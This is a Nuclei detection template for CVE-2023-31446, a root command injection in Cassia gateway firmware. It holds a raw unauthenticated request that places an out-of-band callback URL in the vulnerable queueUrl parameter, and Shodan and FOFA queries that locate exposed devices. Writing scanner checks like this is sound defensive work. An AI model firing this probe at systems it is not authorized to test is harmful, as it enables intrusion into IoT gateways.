http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - regex:
    - ^OK$
    type: regex
  matchers-condition: and
  raw:
  - '@timeout: 20s

    GET /bypass/config?type=sqs&keyId=test&key=security&queueUrl=http://{{interactsh-url}}/
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-31446
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:o:cassianetworks:xc1000_firmware:2.1.1.2303082218:*:*:*:*:*:*:*
    cve-id: CVE-2023-31446
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99736
    epss-score: 0.92671
  description: 'In Cassia Gateway firmware XC1000_2.1.1.2303082218 and XC2000_2.1.1.2303090947,
    the queueUrl parameter in /bypass/config is not sanitized. This leads to injecting
    Bash code and executing it with root privileges on device startup.

    '
  impact: 'Unauthenticated attackers can inject Bash code through the queueUrl parameter
    which executes with root privileges on device startup, potentially compromising
    the Bluetooth gateway and all connected IoT devices.

    '
  metadata:
    fofa-query: body="cassia bluetooth gateway management platform"
    max-request: 1
    product: xc1000_firmware
    shodan-query:
    - html:"Cassia Bluetooth Gateway Management Platform"
    - http.html:"cassia bluetooth gateway management platform"
    vendor: cassianetworks
    verified: true
  name: Cassia Gateway Firmware - Remote Code Execution
  reference:
  - https://github.com/advisories/GHSA-89ph-wr9x-hcfc
  - https://github.com/Dodge-MPTC/CVE-2023-31446-Remote-Code-Execution
  - https://vuldb.com/?id.250210
  - https://blog.kscsc.online/cves/202331446/md.html
  - https://www.cassianetworks.com
  remediation: 'Update Cassia Gateway firmware to a version newer than XC1000_2.1.1.2303082218
    and XC2000_2.1.1.2303090947 that properly sanitizes the queueUrl parameter.

    '
  severity: critical
  tags: cve,cve2023,rce,cassia,gateway,cassianetworks,vkev,vuln
